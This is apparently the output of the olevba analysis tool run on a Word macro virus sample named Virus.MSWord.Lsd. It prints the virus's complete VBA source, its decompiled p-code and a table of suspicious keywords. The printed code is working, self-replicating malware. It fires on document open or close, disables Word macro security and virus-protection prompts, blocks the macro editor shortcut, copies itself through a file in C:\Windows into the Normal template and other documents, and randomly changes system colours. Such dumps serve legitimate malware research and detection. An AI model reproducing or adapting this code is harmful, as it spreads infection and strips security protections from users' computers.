olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Lsd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Lsd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: ./Virus.MSWord.Lsd - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long
Private Sub Document_Open()
' LSD
' By The WalruS 09/00 v1.00

    On Error Resume Next
    
    Randomize

    If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
    
   Select Case Application.Version
    
    Case "9.0"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
        CommandBars("Macro").Controls("Security...").Enabled = False
    
    Case "8.0"
        Options.VirusProtection = False
        Options.SaveNormalPrompt = False
        Options.ConfirmConversions = False
    End Select
     
    With Application
        .ScreenUpdating = False
        .DisplayStatusBar = False
        .DisplayAlerts = False
    End With
    
    KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "

    Set nor = NormalTemplate.VBProject.vbcomponents(1).CodeModule
    Set doc = ActiveDocument.VBProject.vbcomponents(1).CodeModule

    ChangeHook = Int(Rnd * 2)
    Select Case ChangeHook
    
    Case 0
        Hook = "Private Sub Document_Open()"
        
    Case 1
        Hook = "Private Sub Document_Close()"
    
    End Select
    
    Open "C:\Windows\" & Day(Now) & ".sys" For Output As #1
    Print #1, "Private Declare Function SetSysColors Lib ""user32"" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long"
    Print #1, Hook
    Print #1, VBProject.vbcomponents(1).CodeModule.Lines(3, 110)
    Close #1

    If nor.Lines(3, 1) <> "' LSD" Then
        nor.DeleteLines 1, nor.CountOfLines
        nor.AddFromFile ("C:\Windows\" & Day(Now) & ".sys")
        NormalTemplate.Save
    ElseIf doc.Lines(3, 1) <> "' LSD" Then
        doc.DeleteLines 1, doc.CountOfLines
        doc.AddFromFile ("C:\Windows\" & Day(Now) & ".sys")
    End If

    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "WalruS"
        .Title = "CandyFlippin"
        .Execute
    End With
    
    TimeCheck = Second(Now)
    One = Left(TimeCheck, 1)
    Two = Right(TimeCheck, 1)
    If One = Two Then Call CandyFlip
   
     NormalTemplate.Saved = True
    If ActiveDocument.Saved <> True Then ActiveDocument.Save

End Sub

Private Sub CandyFlip()
    On Error Resume Next
    a = SetSysColors(1, 1, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 2, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 3, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 4, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 5, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 6, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 7, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 8, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 9, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 10, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 11, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 12, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 13, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 14, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 15, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 16, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 17, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 18, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 19, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 20, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 21, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 22, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 23, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 24, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 25, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 26, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
    a = SetSysColors(1, 27, RGB(Rnd * 255, Rnd * 255, Rnd * 255))
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Lsd
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/ThisDocument1 - 7100 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long)
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	QuoteRem 0x0000 0x0004 " LSD"
' Line #4:
' 	QuoteRem 0x0000 0x001A " By The WalruS 09/00 v1.00"
' Line #5:
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' Line #8:
' 	ArgsCall Read 0x0000 
' Line #9:
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #11:
' Line #12:
' 	Ld Application 
' 	MemLd Version 
' 	SelectCase 
' Line #13:
' Line #14:
' 	LitStr 0x0003 "9.0"
' 	Case 
' 	CaseDone 
' Line #15:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #16:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #17:
' Line #18:
' 	LitStr 0x0003 "8.0"
' 	Case 
' 	CaseDone 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #22:
' 	EndSelect 
' Line #23:
' Line #24:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #25:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith DisplayStatusBar 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith DisplayAlerts 
' Line #28:
' 	EndWith 
' Line #29:
' Line #30:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0000 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0001 " "
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #31:
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd CodeModule 
' 	Set doc 
' Line #34:
' Line #35:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St ChangeHook 
' Line #36:
' 	Ld ChangeHook 
' 	SelectCase 
' Line #37:
' Line #38:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #39:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St Hook 
' Line #40:
' Line #41:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #42:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	St Hook 
' Line #43:
' Line #44:
' 	EndSelect 
' Line #45:
' Line #46:
' 	LitStr 0x000B "C:\Windows\"
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007E "Private Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Hook 
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0003 
' 	LitDI2 0x006E 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #51:
' Line #52:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld nor 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0005 "' LSD"
' 	Ne 
' 	IfBlock 
' Line #53:
' 	LitDI2 0x0001 
' 	Ld nor 
' 	MemLd CountOfLines 
' 	Ld nor 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #54:
' 	LitStr 0x000B "C:\Windows\"
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #55:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0005 "' LSD"
' 	Ne 
' 	ElseIfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd CountOfLines 
' 	Ld doc 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #58:
' 	LitStr 0x000B "C:\Windows\"
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	Paren 
' 	Ld doc 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #59:
' 	EndIfBlock 
' Line #60:
' Line #61:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #62:
' 	LitStr 0x0006 "WalruS"
' 	MemStWith Author 
' Line #63:
' 	LitStr 0x000C "CandyFlippin"
' 	MemStWith Title 
' Line #64:
' 	ArgsMemCallWith Execute 0x0000 
' Line #65:
' 	EndWith 
' Line #66:
' Line #67:
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	St TimeCheck 
' Line #68:
' 	Ld TimeCheck 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	St One 
' Line #69:
' 	Ld TimeCheck 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	St Two 
' Line #70:
' 	Ld One 
' 	Ld Two 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) CandyFlip 0x0000 
' 	EndIf 
' Line #71:
' Line #72:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #73:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #74:
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Private Sub CandyFlip())
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #80:
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #81:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #82:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #83:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #84:
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #85:
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #86:
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #87:
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #88:
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #89:
' 	LitDI2 0x0001 
' 	LitDI2 0x000B 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #90:
' 	LitDI2 0x0001 
' 	LitDI2 0x000C 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #91:
' 	LitDI2 0x0001 
' 	LitDI2 0x000D 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #92:
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #93:
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #94:
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #95:
' 	LitDI2 0x0001 
' 	LitDI2 0x0011 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #96:
' 	LitDI2 0x0001 
' 	LitDI2 0x0012 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #97:
' 	LitDI2 0x0001 
' 	LitDI2 0x0013 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #98:
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #99:
' 	LitDI2 0x0001 
' 	LitDI2 0x0015 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #100:
' 	LitDI2 0x0001 
' 	LitDI2 0x0016 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #101:
' 	LitDI2 0x0001 
' 	LitDI2 0x0017 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #102:
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #103:
' 	LitDI2 0x0001 
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #104:
' 	LitDI2 0x0001 
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #105:
' 	LitDI2 0x0001 
' 	LitDI2 0x001B 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	ArgsLd RSet 0x0003 
' 	ArgsLd SetSysColors 0x0003 
' 	St a 
' Line #106:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

